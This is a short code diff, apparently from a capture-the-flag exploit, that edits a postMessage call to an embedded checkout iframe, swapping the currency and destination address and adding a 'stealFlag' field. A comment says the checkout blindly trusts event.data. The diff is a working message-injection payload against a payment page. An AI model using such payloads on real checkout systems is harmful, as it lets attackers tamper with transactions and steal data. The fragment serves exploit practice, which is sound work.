@@ -15,9 +15,9 @@ setTimeout(() => {
   iframe.contentWindow.postMessage({
     type: "submitTransaction",
     transaction: {
-      currency: "BTC",
+      currency: "1337COIN",
       amount: 1,
-      toAddress: "1744034f7dd40343da758f9af362f4c88b"
+      toAddress: "114a580aae95817f9bf8d3704eb6e69417"
     },
     // 👇 malicious extra data (checkout blindly trusts event.data)
     stealFlag: true
